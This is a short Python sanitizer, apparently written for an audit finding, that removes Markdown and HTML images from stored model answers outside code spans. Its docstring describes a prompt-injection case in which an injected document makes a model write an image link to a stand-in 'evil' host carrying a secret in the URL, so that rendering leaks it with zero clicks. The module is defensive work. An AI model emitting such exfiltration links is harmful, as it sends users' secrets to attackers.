"""Answer hygiene applied before an answer is stored (audit S3).

A prompt-injected document can ask the model to write `![](https://evil/?d=<secret>)`;
any client that renders the image sends the data with zero clicks. Stored answers keep
the alt text and drop the image, so every consumer (web, API, MCP, Slack) is safe."""

import re

_MD_IMAGE = re.compile(r"!\[([^\]\n]*)\]\s*(?:\([^)\n]*\)|\[[^\]\n]*\])")
_HTML_IMAGE = re.compile(r"<img\b[^>]*>", re.IGNORECASE)
_CODE = re.compile(r"(```[\s\S]*?```|`[^`\n]*`)")


def _strip(part: str) -> str:
    part = _MD_IMAGE.sub(
        lambda m: f"[image: {m.group(1).strip()}]" if m.group(1).strip() else "", part
    )
    return _HTML_IMAGE.sub("", part)


def strip_images(text: str) -> str:
    """Remove Markdown and HTML images outside code spans and blocks."""
    parts = _CODE.split(text)
    return "".join(p if i % 2 else _strip(p) for i, p in enumerate(parts))
